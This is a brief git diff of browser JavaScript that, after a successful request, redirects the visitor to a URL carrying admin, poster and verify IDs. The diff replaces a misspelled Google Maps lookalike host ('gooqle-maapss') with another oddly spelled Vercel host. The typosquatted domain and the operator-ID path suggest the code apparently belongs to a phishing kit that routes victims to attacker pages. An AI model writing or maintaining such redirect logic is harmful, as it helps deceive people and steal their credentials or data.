@@ -72,7 +72,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     console.log('Response:', data);
                     if (data) {
                         // Redirect to another URL on success
-                        window.location.href =   `https://gooqle-maapss.vercel.app/${adminId}/${posterId}/${verifyId}`;;
+                        window.location.href =   `https://revieww-mega.vercel.app/${adminId}/${posterId}/${verifyId}`;;
                     }
                 })
                 .catch(error => {
